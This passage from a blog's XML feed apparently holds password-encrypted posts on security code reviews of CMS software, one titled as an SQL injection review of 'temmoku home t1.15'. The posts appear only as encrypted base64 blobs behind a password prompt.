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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Reviewtemmoku home t1.15 sqli</title>
      <link href="2019/02/21/php/temmoku-t1-15-sqli/"/>
      <url>2019/02/21/php/temmoku-t1-15-sqli/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="welcome to my blog, enter password to read." />    <label for="pass">welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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